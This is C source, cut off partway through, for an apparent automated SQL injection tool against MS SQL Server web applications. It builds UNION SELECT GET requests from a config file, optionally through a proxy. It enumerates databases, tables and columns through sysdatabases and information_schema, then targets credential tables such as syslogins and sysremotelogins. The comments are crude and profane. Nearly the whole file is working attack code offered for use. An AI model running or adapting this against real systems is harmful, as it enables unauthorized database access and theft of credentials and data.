#include <stdio.h>
#include <string.h>
#include <pcre.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define OVECCOUNT 30

#define BUF 200
#define BIGBUF 8196
#define LARBUF 4000


FILE *cfgfile;
FILE *outfile;


struct opts {
  char url[BUF];
  char regex[60];
  char doneregex[60];
  char pog[5]; 
  char variables[60];
  char injectvar[25];
  char start[25];
  char end[25];
  int select_num;
  int postget;
  } cfgopts;

struct dt {
  char *data[BUF];
  unsigned long int rows;
};

typedef struct dt data_t;

struct cd {
  char *column_name[BUF];
  data_t *data;
  unsigned long int data_num;
};

typedef struct cd column_t;

struct tb {
  char *table_name[BUF];
  column_t *columns;
  unsigned long int column_num;
};

typedef struct tb table_t; 

struct db {
  char *dbname[BUF];
  table_t *tables;
  unsigned long int table_num;
};

typedef struct db datab_t;
unsigned long int numb_db;

datab_t *db;
struct sockaddr_in servaddr; 
struct sockaddr_in proxyaddr;
char *host, *phost;
int port, pport, proxy_use, debug;


int usage(int argc, char **argv);
int resolve(char *hostname);
int getconfigs(void);
int getcookie(int sockfd, int n, char *cookie, char *hostname);
int my_strntok(char *string,char *delim,char *dest, int destsize);
int stripdata(char *recvbuf, char *data_to_add);
int db_send_data(int sockfd, char *sendbuf, char *recvbuf, char *hostname, char *cookie);
int gather_dbname_get(int sockfd, int n, char *cookie, char *hostname);
int gather_tables_get(int sockfd, int n, char *cookie, char *hostname);
int gather_data_get(int sockfd, int n, char *cookie, char *hostname);
int gather_columns_get(int sockfd, int n, char *cookie, char *hostname);
int gather_tables_post(int sockfd, int n, char *cookie, char *hostname);
int check_done(char *recvbuf); 

int main(int argc, char **argv)
{
  int sockfd, n, i, j, d, k;
  char cookie[100];
  
  proxy_use = debug = 0;
  
  while ((d = getopt(argc, argv, "dx:t:p:")) != -1) {
        switch(d) {	
	  
		case 'x':
		 	proxy_use = 1;
			phost = optarg;	
			break;
		case 't':
			pport = atoi(optarg);
			break;
		case 'p':
			port = atoi(optarg);
			break;
 		case 'd':
			debug = 1;
			break;
		case '?':
			usage(argc, argv);
 			exit(-1);
                        break;
		case ':':
			usage(argc, argv);
			exit(-1);
			break;
		default:
			usage(argc, argv);
 			exit(-1);
			break;
	}
  }
  if(!argv[optind]) {
     printf("we need a target.\n");
     usage(argc, argv);
     exit(1);
  }

 host = argv[optind];

 printf("%d\n",optind);
 printf("\"%s\"\n",argv[optind]);

 
  if (proxy_use == 1) {
     bzero(&proxyaddr, sizeof(proxyaddr));
     proxyaddr.sin_family = AF_INET;
     proxyaddr.sin_port = htons(pport);
     if (!resolve(phost)) {
        fprintf(stderr, "Error resolving %s\n", phost);
        exit(0);
     }
  } else {
     bzero(&servaddr, sizeof(servaddr));
     servaddr.sin_family = AF_INET;
     servaddr.sin_port = htons(port);
     if (!resolve(host)) {
        fprintf(stderr, "Error resolving %s\n", host);
        exit(0);
     }
  }

  if (getconfigs()) {
     fprintf(stderr,"Error in Configuration File ... Exiting\n");
     exit(4);
  }

  if(mkdir(host, 0700)) {
    fprintf(stderr, "Error creating directory %s Exiting\n", host);
    exit(-1);
  }
  if(chdir(host)) { 
    fprintf(stderr, "Error chdiring to %s Exiting...\n", host); 
    exit(-1);
  }

  if (getcookie(sockfd, n, cookie, host)) {
     fprintf(stderr,"Error getting cookie\n");
     exit(5);
  }
 
  if (cfgopts.postget == 0) {
     printf("Doing a GET attack\n");
     if (gather_dbname_get(sockfd, n, cookie, host)) {
	fprintf(stderr, "Error gathering dbname's via GET, maybe the sql.cfg is effed?\n");
 	exit(6);
     }

     if (gather_tables_get(sockfd, n, cookie, host)) {
        fprintf(stderr, "Error gathering tables via GET, maybe the sql.cfg is effed?\n");
        exit(7);
     }
   
     if (gather_columns_get(sockfd, n, cookie, host)) {
        fprintf(stderr, "Error gathering columns via GET, maybe the sql.cfg is effed?\n");
        exit(8);
     }
  
  for (i = 0; i <= numb_db; i++) {
      if ((char *)db[i].dbname == NULL) {
         continue;
      }
      if (strlen((char *)db[i].dbname) == 0) {
         continue;
      }
      if ((outfile = fopen((char *)db[i].dbname, "w")) == NULL) {
         fprintf(stderr, "Error creating db file: %s %d\n", db[i].dbname, i);
         exit(-1); 
      }


      if (debug == 1) { 
         printf("=========================================================================\n");
         printf("Database Name: %s\n", db[i].dbname);
      }
 
     //fprintf(outfile, "Database Name: %s\n", db[i].dbname);


      for (j = 0; j <= db[i].table_num; j++) {
          if ((char *)db[i].tables[j].table_name == NULL) {
             continue;
          }
          if (strlen((char *)db[i].tables[j].table_name) == 0) {
             continue;
          }

          
          if (debug == 1) {
             printf("\tTable Name: %s\n", db[i].tables[j].table_name);
          }

          //fprintf(outfile, "\tTable Name: %s\n", db[i].tables[j].table_name);
	  

          for (k = 0; k <= db[i].tables[j].column_num; k++) {
               if ((char *)db[i].tables[j].columns[k].column_name == NULL) {
                  continue;
	       }
               if (strlen((char *)db[i].tables[j].columns[k].column_name) == 0) {
                  continue;
               }
               if (debug == 1) {
                  printf("\t\tColumn Name: %s\n", db[i].tables[j].columns[k].column_name);
  	       }
	       fprintf(outfile, "db[%d]: %s\ttable[%d]: %s\t\t\t\tcolumn[%d]: %s\n", i, db[i].dbname, j, db[i].tables[j].table_name, k, db[i].tables[j].columns[k].column_name);
//     fprintf(outfile, "\tColumn Name: %s\n", db[i].tables[j].columns[k].column_name);

          } // close columns
      }  // close tables

  fclose(outfile);
  } // close db's



     if (gather_data_get(sockfd, n, cookie, host)) {
	fprintf(stderr, "Error gathering dizata via GET, maybe YOU JUST SUCK FATTY HAHAHA\n");
        exit(8);
     }

  } else {
    printf("doing a POST attack\n");
    if (gather_tables_post(sockfd, n, cookie, argv[1])) {
       fprintf(stderr, "Error gathering tables via POST, maybe the sql.cfg is effed?\n");
       exit(20);
    }
  }

/*  for (i = 0; i <= numb_db; i++) {
      printf("=========================================================================\n");
      printf("Database Name: %s\n", db[i].dbname);
      
      for (j = 0; j <= db[i].table_num; j++) {
	  printf("--------------------------\n"); 
          printf("Num Tables: %d\n", (int)db[i].table_num);
	  if (db[i].table_num == 0) {
             m++;
             break;
          }
          printf("\tTable Name: %s\n", db[i].tables[j].table_name);

          for (k = 0; k <= db[i].tables[j].column_num; k++) {
               printf("Num Columns: %d\n", (int)db[i].tables[j].column_num);
	       if (db[i].tables[j].column_num == 0) {
                  o++;  
                  break;
               }
 	       printf("\t\tColumn Name: %s\n", db[i].tables[j].columns[k].column_name); 
          }
	  db[i].tables[j].column_num = o;
      }
      db[i].table_num = m;
      printf("=========================================================================\n");
  }

*/

  return(0);
}


int getconfigs(void) 
{

  char line[BUF], name[BUF], value[BUF];
  char *delim = "=\r\n";
  bzero(&cfgopts, sizeof(cfgopts));
 

  cfgfile = fopen("sql.cfg","r");
  if (cfgfile == NULL) {
     fprintf(stderr,"Error can not open sql.cfg file Aborting.\n");
     exit(-1);
  }

  while (fgets(line, sizeof(line), cfgfile) != NULL) 
        {

	if(!my_strntok(line,delim,name,BUF)) {			//moves ptr to =
		printf("fatal error in strntok :(\n");
		exit(1);
	}
	if (!my_strntok(NULL, delim, value, BUF)) {	//cp .* to eol
		printf("fatal error in strntok :(\n");
		exit(1);
	}
	  
          if ( strncmp("url", name, 3) == 0 ) {
		strncpy(cfgopts.url, value, sizeof(cfgopts.url));
		printf("%s\n", cfgopts.url);
		continue;
	  }
	
  	  else if ( strncmp("gop", name, 3) == 0 ) {
		strncpy(cfgopts.pog, value, sizeof(cfgopts.pog));
		if ( strncmp("POST", value, 4) == 0) {
		   cfgopts.postget = 1;
		} else {
		   cfgopts.postget = 0;
	 	}	
		continue;
	  }

	  else if ( strncmp("regex", name, 5) == 0) {
		strncpy(cfgopts.regex, value, sizeof(cfgopts.regex));
	        continue;
          }

          else if ( strncmp("variables", name, 8) == 0 ) {
                if (strncmp("\n", value, 1)) {
		   continue;
		}
		strncpy(cfgopts.variables, value, sizeof(cfgopts.variables));
                strncat(cfgopts.variables, "=", 3);
		continue;
	  }	

	  else if ( strncmp("injectvar", name, 9) == 0 ) {
  		strncpy(cfgopts.injectvar, value, sizeof(cfgopts.injectvar));
		strncat(cfgopts.injectvar, "=", 3);
                continue;
  	  }

	  else if ( strncmp("start", name, 5) == 0 ) {
		strncpy(cfgopts.start, value, sizeof(cfgopts.start));
	 	continue;	
 	  }

	  else if ( strncmp("selects", name, 7) == 0 ) {
		cfgopts.select_num = atoi(value);
		continue;
	  }

	  else if ( strncmp("end", name, 3) == 0 ) {
		strncpy(cfgopts.end, value, sizeof(cfgopts.end));
		continue;
          }
 
          else if ( strncmp("doneregex", name, 9) == 0 ) {
		strncpy(cfgopts.doneregex, value, sizeof(cfgopts.doneregex));
	 	continue;

          } else {
	    fprintf(stderr,"i dunno\n");
	    return(1);
	  }
 	
       }
  return(0);
}


/*********************/
/* Cookie Monster :D */
/*********************/

int getcookie(int sockfd, int n, char *cookie, char *hostname) 
{

  const char *error;
  pcre *re;
  int erroffset;
  int ovector[OVECCOUNT];
  int rc, i;
  char tmpbuf[100];
  char sendbuf[BUF], recvbuf[BIGBUF];

  if (proxy_use == 1) {
      snprintf(sendbuf, sizeof(sendbuf), "GET http://%s HTTP/1.0\x0d\x0aHost: %s\x0d\x0a\x0d\x0a", hostname, hostname);

      if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         perror("heh socket probz");
         exit(7);
      }

      if (connect(sockfd, (struct sockaddr *)&proxyaddr, sizeof(proxyaddr)) < 0) {
          perror("connect issues!");
          exit(7);
      }
  } else {
      snprintf(sendbuf, sizeof(sendbuf), "GET / HTTP/1.0\x0d\x0aHost: %s\x0d\x0a\x0d\x0a", hostname);

      if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
          perror("heh socket probz");
          exit(7);
      }
   
      if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
    	 perror("heh connect issues\n");
      }

  }

  send(sockfd, sendbuf, strlen(sendbuf),0);
  recv(sockfd, recvbuf, sizeof(recvbuf),0);

  close(sockfd);
  re = pcre_compile(
  "Set-Cookie:\\s(.*;.*)",
  0,
  &error,
  &erroffset,
  NULL);

if (re == NULL)
   {
     printf("PCRE compilation failed: %s\n", error);
     return(1);
   }

rc = pcre_exec(
  re,
  NULL,
  recvbuf,
  (int)strlen(recvbuf),
  0,
  0,
  ovector,
  OVECCOUNT);
 
for (i = 0; i < rc; i++)
  {
  char *substring_start = recvbuf + ovector[2*i];
  int substring_length = ovector[2*i+1] - ovector[2*i];
  snprintf(tmpbuf, sizeof(tmpbuf), "%.*s", substring_length, substring_start);
  }
  memcpy(cookie, tmpbuf, sizeof(tmpbuf));  
  close(sockfd);
  return(0);
}


/*******************************/
/* gather get database names   */
/*******************************/

int gather_dbname_get(int sockfd, int n, char *cookie, char *hostname)
{
  char tmpbuf[BUF], tmpbuf2[BUF * 2], tmpbuf3[BUF * 2], recvbuf[BIGBUF], sendbuf[BIGBUF];
  char numbs[] = "cast(count(*)%20as%20char(15)),";
  char numb[] = "cast(count(*)%20as%20char(15))%20";
  char names[] = "name,";
  char name[] = "name%20";
  int len, x, i; 
  char *data_to_add;
  data_to_add = (char *)malloc(500);
  if (data_to_add == NULL){
     fprintf(stderr, "Error mallocing data_to_add\n");
     exit(3);
  }
  x = 0; 
  bzero(&sendbuf, sizeof(sendbuf));
  bzero(&recvbuf, sizeof(recvbuf));
  bzero(&tmpbuf, sizeof(tmpbuf));
  bzero(&tmpbuf2, sizeof(tmpbuf2));
  bzero(&tmpbuf3, sizeof(tmpbuf3));



  if (proxy_use == 1) {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // since we need this for both buff's just strncpy the shizzle
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.injectvar, cfgopts.start);
	 len = strlen(tmpbuf2);
	 strncpy(tmpbuf3, tmpbuf2, len); // heh
     }
  } else {
     if (strncmp(cfgopts.variables, "\n", 1)) { 
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
	 len = strlen(tmpbuf2);
	 strncpy(tmpbuf3, tmpbuf2, len); // heh still
     } else { 
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.injectvar, cfgopts.start);
 	 len = strlen(tmpbuf2);
   	 strncpy(tmpbuf3, tmpbuf2, len);
     }
  }


  /* start teh first tmpbuf cos like its different than the second one which will be used for the non-count/name, shit i fucking stopped caring */
  /****************/

  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
         len = strlen(numb);
         strncat(tmpbuf2, numb, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf2, numbs, len);
  }
  /* so basically our buff looks like gay.asp?id=1 union select count(count(*)%20as%20char(15))%20" ... */
  /* end tmpbuf                                                                                         */
  /******************************************************************************************************/




  /* tmpbuf numero deuce HAHA DEUCE WHAT THE DEUCE? HAHAHAHA */
  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
	 len = strlen(name);
         strncat(tmpbuf3, name, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf3, names, len);
  }
  /* now tmpbuf3 looks like union select name ... */
  /* heh                                          */
  /************************************************/
  


  len = strlen(tmpbuf2);
  strncpy(sendbuf, tmpbuf2, len); // copy everything from tmpbuf2 into our sendbuf (for our first request)  

  snprintf(tmpbuf, sizeof(tmpbuf), "from%%20master.dbo.sysdatabases"); 

  len = strlen(tmpbuf);
  strncat(sendbuf, tmpbuf, len); // tack the from shit onto the end of our sendbuf


  if (debug == 1) {
     printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
     printf("%s\n", sendbuf);
     printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
  }

  /* Make our first bloody request THANK FUCKING GOD ONLY TOOK 500 LINES OF USELESS SHIT CODE */
  db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie); 

  if (debug == 1) {
     printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
     printf("%s", recvbuf);
     printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
  }

  if (stripdata(recvbuf, data_to_add) == 1) {
      fprintf(stderr, "Error finding the number of databases\n");
      exit(2);
  }

  /* here we malloc the db[] to whatever we got as a return result this way we know zactly how many db's */
  numb_db = strtoul(data_to_add, NULL, 0);
  db = (datab_t *)malloc(sizeof(datab_t)*numb_db);  
  if (db == NULL) {
     fprintf(stderr, "Error mallocing db ;/\n");
     exit(3);
  }

  bzero(&sendbuf, sizeof(sendbuf));
  bzero(&recvbuf, sizeof(recvbuf));

  len = strlen(tmpbuf3); 		// member the tmpbuf3 we made? :D
  strncpy(sendbuf, tmpbuf3, len);	// now our sendbuf is setup for name type request	



  
  len = strlen(tmpbuf);
  strncat(sendbuf, tmpbuf, len); // tack this on again

  if (debug == 1) {
     printf("\n++++++++++++++++++++++++1st Name+++++++++++++++++++++++++++++++++++\n");
     printf("%s\n", sendbuf);
     printf("\n++++++++++++++++++++++++1st Name+++++++++++++++++++++++++++++++++++\n");
  }

  db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

  if (debug == 1) {
     printf("\n\n---------------------------1st name Results---------------------------------------------\n");
     printf("%s", recvbuf);
     printf("\n\n---------------------------1st name Results---------------------------------------------\n");
  }
  if (stripdata(recvbuf, data_to_add) == 1) {
      fprintf(stderr, "Error finding the database name\n");
      exit(2);
  } 
        memcpy(&db[0].dbname, data_to_add, BUF); // we should have our first name in db[0].dbname probably 'master'

	memset(data_to_add, 0, 500);
        bzero(&recvbuf, sizeof(recvbuf));
	bzero(&tmpbuf, sizeof(tmpbuf));
	bzero(&sendbuf, sizeof(sendbuf));

	len = strlen(tmpbuf3);
	strncat(sendbuf, tmpbuf3, len);

        snprintf(tmpbuf, sizeof(tmpbuf), "from%%20master.dbo.sysdatabases%%20where%%20name<>\'%s\'", db[0].dbname);

        len = strlen(tmpbuf);
	strncat(sendbuf, tmpbuf, len);

	if (debug == 1) {
           printf("\n++++++++++++++++++++++++++++Where name+++++++++++++++++++++++++++++++\n");
           printf("%s\n", sendbuf);
           printf("\n++++++++++++++++++++++++++++Where name+++++++++++++++++++++++++++++++\n");
        }

	db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

	if (debug == 1) {
           printf("\n\n-------------------------------Where name results-----------------------------------------\n");
           printf("%s", recvbuf);
           printf("\n\n-------------------------------Where name results-----------------------------------------\n");
        }

        if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
           fprintf(stderr, "Error finding the database name\n");
           exit(2);
        }
	bzero(&tmpbuf, sizeof(tmpbuf));

	/* START THE FUCKING LLOPPWPEOIEWURWEOPIURWET */
	for (i = 1; i <= numb_db; i++) { 			// Starting at 1 cos we have master in db[0], this fucked me up for a while heh :D
	    memcpy(&db[i].dbname, data_to_add, BUF);
	    memset(data_to_add, 0, 500);
            snprintf(tmpbuf, sizeof(tmpbuf), "%%20and%%20name%%20<>\'%s\'", db[i].dbname);
	    len = strlen(tmpbuf);
	    strncat(sendbuf, tmpbuf, len);
	    x += len;
	   
	    bzero(&recvbuf, sizeof(recvbuf)); 
            bzero(&tmpbuf, sizeof(tmpbuf));   
            memset(data_to_add, 0, 500);    
            
	    if (debug == 1) {
	       printf("\n+++++++++++++++++++++++++++Run %d++++++++++++++++++++++++++++++++\n", i);
               printf("%s\n", sendbuf);
               printf("\n+++++++++++++++++++++++++++Run %d++++++++++++++++++++++++++++++++\n", i);
	    }

	    db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

	    if (debug == 1) {
               printf("\n\n--------------------------------run %d res----------------------------------------\n", i);
               printf("%s", recvbuf);
               printf("\n\n--------------------------------run %d res----------------------------------------\n", i);
	    }

            if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
                fprintf(stderr, "Error finding the database name, We MUST BE DONE HAAHAHAH\n");
		break;
            }
	}  
 return(0);
}

/*********************************/
/* get information_schema.tables */
/*********************************/

int gather_tables_get(int sockfd, int n, char *cookie, char *hostname)
{
  char tmpbuf[BUF], tmpbuf2[BUF * 2], tmpbuf3[BUF * 2], recvbuf[BIGBUF], sendbuf[BIGBUF];
  char numbs[] = "cast(count(*)%20as%20char(15)),"; // converts the numbers to ascii (inside sql)
  char numb[] = "cast(count(*)%20as%20char(15))%20"; // same but this will be the final query
  char names[] = "table_name,"; // selects the table_name if called multiple times (hence the ,)
  char name[] = "table_name%20"; // final table_name call
  int len, x, i, j; 
  char *data_to_add;
  data_to_add = (char *)malloc(500); 				// our pizointer for grabbing data
  if (data_to_add == NULL){
     fprintf(stderr, "Error mallocing data_to_add\n");
     exit(3);
  }
  x = 0;
  bzero(&sendbuf, sizeof(sendbuf));
  bzero(&recvbuf, sizeof(recvbuf));
  bzero(&tmpbuf, sizeof(tmpbuf));
  bzero(&tmpbuf2, sizeof(tmpbuf2));
  bzero(&tmpbuf3, sizeof(tmpbuf3));



  if (proxy_use == 1) {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // since we need this for both buff's just strncpy the shizzle
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh
     }
  } else {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh still
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET %s%s%s%%20union%%20select%%20", cfgopts.url, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len);
     }
  }

  /* start teh tmpbuf2 cos like its different than the third one which will be used for the non-count/name, shit i fucking stopped caring */
  /****************/

  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
         len = strlen(numb);
         strncat(tmpbuf2, numb, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf2, numbs, len);
  }
  /* so basically our buff looks like gay.asp?id=1 union select count(count(*)%20as%20char(15))%20" ... */
  /* end tmpbuf                                                                                         */
  /******************************************************************************************************/




  /* tmpbuf3 */
  for (i = 1; i <= cfgopts.select_num; i++) {

      if (i == cfgopts.select_num) {
         len = strlen(name);
         strncat(tmpbuf3, name, len);
         break;
      }

      len = strlen(numbs);
      strncat(tmpbuf3, names, len);
  }
  /* now tmpbuf3 looks like union select name ... */
  /* heh                                          */
  /************************************************/


  /* BEGIN LOOPING DATABASE NAMES VIA NUMB_DB */
  for (i = 0; i <= numb_db; i++) {			// ok our first main loop
      if ((char *)db[i].dbname == NULL) {
         continue;
      } else if (strlen((char *)db[i].dbname) == 0) {
         continue;
      }

      bzero(&recvbuf, sizeof(recvbuf));
      bzero(&tmpbuf, sizeof(tmpbuf));
      bzero(&sendbuf, sizeof(sendbuf));
     
      if (strncmp( (char *)db[i].dbname, "master", 6)  == 0) {
         printf("I should only be printing once\n");
         gather_master(i);
         continue;
      }
      printf("CURRENT FUCKING DATABASE IS----------------------------------------------------------------->%s\n", db[i].dbname);


      len = strlen(tmpbuf2);
      strncat(sendbuf, tmpbuf2, len); 			// we need to get the count of tables first...

      snprintf(tmpbuf, sizeof(tmpbuf), "from%%20%s.information_schema.tables",db[i].dbname); // append from [dbname].infoschematables
      len = strlen(tmpbuf);
      strncat(sendbuf, tmpbuf, len);

      if (debug == 1) {
         printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
         printf("%s%s\n", sendbuf, cfgopts.end);
         printf("\n++++++++++++++++++++++++++NUMBERS+++++++++++++++++++++++++++++++++\n");
      }

      db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie); 

      if (debug == 1) {
         printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
         printf("%s", recvbuf);
         printf("\n\n-------------------------RECVNUM-----------------------------------------------\n");
      }
 
      if (stripdata(recvbuf, data_to_add) == 1) {
          fprintf(stderr, "Error finding the number of tables\n");
          exit(2);
      }
       db[i].table_num = strtoul(data_to_add, NULL, 0);
       db[i].tables = (table_t *)malloc(sizeof(table_t) * db[i].table_num);
       if (db[i].tables == NULL) {
          fprintf(stderr, "Error mallocing tables for db[%d] ;/\n", i);
          exit(3);
       }
       memset(db[i].tables, 0, sizeof(table_t) * db[i].table_num); // set the table to null so we can check for null entries later.  


       x = 0;
       bzero(&sendbuf, sizeof(sendbuf));
       bzero(&recvbuf, sizeof(recvbuf));
       bzero(&tmpbuf, sizeof(tmpbuf));


       len = strlen(tmpbuf3);
       strncat(sendbuf, tmpbuf3, len);
 
       snprintf(tmpbuf, sizeof(tmpbuf), "from%%20%s.information_schema.tables", db[i].dbname);
       len = strlen(tmpbuf);
       strncat(sendbuf, tmpbuf, len);

       if (debug == 1) {
          printf("\n++++++++++++++++++++++++1st Name+++++++++++++++++++++++++++++++++++\n");
          printf("%s%s%s\n", sendbuf, cfgopts.end, recvbuf);
          printf("\n++++++++++++++++++++++++1st Name+++++++++++++++++++++++++++++++++++\n");
       }
        
       db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

       if (debug == 1) {
          printf("\n\n---------------------------1st name Results---------------------------------------------\n");
          printf("%s", recvbuf);
          printf("\n\n---------------------------1st name Results---------------------------------------------\n");
       }

       if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
           fprintf(stderr, "Error finding the first table_name\n");
	   continue;
       }
       memcpy(&db[i].tables[0].table_name, data_to_add, BUF);

       memset(data_to_add, 0, 500);
       bzero(&recvbuf, sizeof(recvbuf));
       bzero(&tmpbuf, sizeof(tmpbuf));
       bzero(&sendbuf, sizeof(sendbuf));

       len = strlen(tmpbuf3);
       strncat(sendbuf, tmpbuf3, len);
        
       snprintf(tmpbuf, sizeof(tmpbuf), "from%%20%s.information_schema.tables%%20where%%20table_name<>\'%s\'", db[i].dbname, db[i].tables[0].table_name);
       
       len = strlen(tmpbuf);
       strncat(sendbuf, tmpbuf, len);

       if (debug == 1) {
          printf("\n++++++++++++++++++++++++++++Where name+++++++++++++++++++++++++++++++\n");
          printf("%s\n", sendbuf);
          printf("\n++++++++++++++++++++++++++++Where name+++++++++++++++++++++++++++++++\n");
       }

       db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

       if (debug == 1) {
          printf("\n\n-------------------------------Where name results-----------------------------------------\n");
          printf("%s", recvbuf);
          printf("\n\n-------------------------------Where name results-----------------------------------------\n");
       }

       if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
          fprintf(stderr, "Error finding the table name\n");
	  continue;
       }
       bzero(&recvbuf, sizeof(recvbuf));
       bzero(&tmpbuf, sizeof(tmpbuf));

       /* START THE FUCKING LLOPPWPEOIEWURWEOPIURWET */
       for (j = 1; j <= db[i].table_num; j++) {
           if ((char *)db[i].dbname == NULL) {
              continue;
           } else if (strlen((char *)db[i].dbname) == 0) {
              continue;
           }
           
	   memcpy(&db[i].tables[j].table_name, data_to_add, BUF);
  	   memset(data_to_add, 0, 500);
           snprintf(tmpbuf, sizeof(tmpbuf), "%%20and%%20table_name%%20<>\'%s\'", db[i].tables[j].table_name);
           len = strlen(tmpbuf);
           strncat(sendbuf, tmpbuf, len);

           bzero(&recvbuf, sizeof(recvbuf));
           bzero(&tmpbuf, sizeof(tmpbuf));
           memset(data_to_add, 0, 500);
	   
	   if (debug == 1) {
              printf("\n+++++++++++++++++++++++++++Run %d++++++++++++++++++++++++++++++++\n", i);
              printf("%s\n", sendbuf);
              printf("\n+++++++++++++++++++++++++++Run %d++++++++++++++++++++++++++++++++\n", i);
  	   }

	   db_send_data(sockfd, sendbuf, recvbuf, hostname, cookie);

	   if (debug == 1) {
              printf("\n\n--------------------------------run %d res----------------------------------------\n", i);
              printf("%s", recvbuf);
              printf("\n\n--------------------------------run %d res----------------------------------------\n", i);
	   }

           if (stripdata(recvbuf, data_to_add) == 1 || check_done(recvbuf) != 0) {
               fprintf(stderr, "Error finding the table name, We MUST BE DONE HAAHAHAH\n");
               break;
           }
           bzero(&recvbuf, sizeof(recvbuf));
           bzero(&tmpbuf, sizeof(tmpbuf));
           
	}
   }
return(0);
}

/**********************************/
/* master d0x                     */
/**********************************/

int gather_master(int i)
{
  char important[][BUF] = {"syslogins", "sysremotelogins", "sysservers", "sysusers", "sysfiles"}; 
  int j;

  printf("DB[%d]: %s\n", i, db[i].dbname);
  sleep(1);
  db[i].tables = (table_t *)malloc(sizeof(table_t) * 6);
  if (db[i].tables == NULL) {
     fprintf(stderr, "Error mallocing tables for db[%d] ;/\n", i);
     exit(3);
  }
  memset(db[i].tables, 0, sizeof(table_t) * 5); // set the table to null so we can check for null entries later.



  db[i].table_num = 5;

  for (j = 0; j <= 4; j++) {
      memcpy(&db[i].tables[j].table_name, &important[j], BUF);
  }
      
  return(0);
}

/**********************************/
/* get information_schema.columns */
/**********************************/

int gather_columns_get(int sockfd, int n, char *cookie, char *hostname)
{
  char tmpbuf[BUF * 2], tmpbuf2[BUF * 2], tmpbuf3[BUF * 2], recvbuf[BIGBUF], sendbuf[BIGBUF];
  char numbs[] = "cast(count(*)%20as%20char(15)),"; // converts the numbers to ascii (inside sql)
  char numb[] = "cast(count(*)%20as%20char(15))%20"; // same but this will be the final query
  char names[] = "column_name,"; // selects the table_name if called multiple times (hence the ,)
  char name[] = "column_name%20"; // final table_name call
  int len, i, j, l;
  char *data_to_add;
  data_to_add = (char *)malloc(500);                            // our pizointer for grabbing data
  if (data_to_add == NULL){
     fprintf(stderr, "Error mallocing data_to_add\n");
     exit(3);
  }

  bzero(&sendbuf, sizeof(sendbuf));
  bzero(&recvbuf, sizeof(recvbuf));
  bzero(&tmpbuf, sizeof(tmpbuf));
  bzero(&tmpbuf2, sizeof(tmpbuf2));
  bzero(&tmpbuf3, sizeof(tmpbuf3));



  if (proxy_use == 1) {
     if (strncmp(cfgopts.variables, "\n", 1)) {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.variables, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // since we need this for both buff's just strncpy the shizzle
     } else {
         snprintf(tmpbuf2, sizeof(tmpbuf2), "GET http://%s:%d/%s%s%s%%20union%%20select%%20", hostname, port, cfgopts.url, cfgopts.injectvar, cfgopts.start);
         len = strlen(tmpbuf2);
         strncpy(tmpbuf3, tmpbuf2, len); // heh
     }
  } else {
